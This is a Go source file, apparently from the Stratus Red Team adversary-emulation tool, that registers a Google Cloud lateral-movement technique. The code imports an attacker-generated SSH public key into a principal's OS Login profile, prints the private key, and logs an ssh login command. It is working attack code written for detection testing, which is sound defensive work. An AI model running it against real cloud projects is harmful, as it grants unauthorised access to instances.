package gcp 

import (
    "context"
    _ "embed"
    "time"
    "fmt"
    "log"
    oslogin   "cloud.google.com/go/oslogin/apiv1"
    commonpb  "cloud.google.com/go/oslogin/common/commonpb"
    osloginpb "cloud.google.com/go/oslogin/apiv1/osloginpb"
    gcp_utils "github.com/datadog/stratus-red-team/v2/internal/utils/gcp"
    "github.com/datadog/stratus-red-team/v2/pkg/stratus"
    "github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte 

func init() {
    const CodeBlock = "```"
    const AttackTechniqueId = "gcp.lateral-movement.oslogin-import-sshkey"

    stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
        ID:             AttackTechniqueId,
        FriendlyName:   "Import SSH public key to profile",
        Description:`
Register SSH public key to profile of user or service account. This key is set to valid for 30 minutes.

Warm-up:

- Create a compute instance (Linux).

Detonation:

- Create RSA key-pair (private key and public key)
- Register public key to user's profile
- Print private key to stdout

Note that you need to save the private key for login.

The following IAM roles determine what privileges when accessing the instance using oslogin:

- roles/compute.osLogin (no sudo)
- roles/compute.osAdminLogin (has sudo)

Reference:

- https://cloud.google.com/sdk/gcloud/reference/compute/os-login/ssh-keys/add
`,
        Detection:`under construction`,
        Platform:                   stratus.GCP,
        IsIdempotent:               true,
        MitreAttackTactics:         []mitreattack.Tactic{mitreattack.LateralMovement},
        PrerequisitesTerraformCode: tf,
        Detonate:                   detonate,
    })
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
    gcp := providers.GCP()
    ctx := context.Background()

    projectId    := gcp.GetProjectId()
    instanceIp   := params["instance_ip"]
    principal    := params["principal"]

    log.Printf("Principal: %s | project: %s\n", principal, projectId)

    // create oslogin service
    client, err := oslogin.NewClient(ctx)
    if err != nil {
        return fmt.Errorf("Failed to create new service client: %v", err)
    }
    defer client.Close()

    log.Println("Generating public/private key pair for user")

    // create RSA public/private key pair
    key, err := gcp_utils.CreateSSHKeyPair()
    if err != nil {
        return fmt.Errorf("Failed to create RSA key-pair: %v", err)
    }

    log.Println("Registering key to user")

    // importing the key (only valid for 30 minutes)
    parent := fmt.Sprintf("users/%s", principal)
    pubkey := &commonpb.SshPublicKey {
        Key:                string(key.PublicKey),
        ExpirationTimeUsec: time.Now().Add(30 * time.Minute).UnixMicro(),
    }

    resp, err := client.ImportSshPublicKey(ctx, &osloginpb.ImportSshPublicKeyRequest {
        Parent:       parent,
        SshPublicKey: pubkey,
        ProjectId:    projectId,
    })
    if err != nil {
        return fmt.Errorf("Failed to register SSH key: %v", err)
    }

    // retrieve the username created by oslogin
    username := resp.LoginProfile.PosixAccounts[0].Username

    log.Printf("Save this private key as 'account.priv':\n\n%s\n", key.PrivateKey)
    log.Println("Attacker can now login to the instance using the following command:")
    log.Printf("ssh -i account.priv %s@%s", username, instanceIp)
    log.Printf("Wait 30 minutes for the key to expire")

    return nil 
}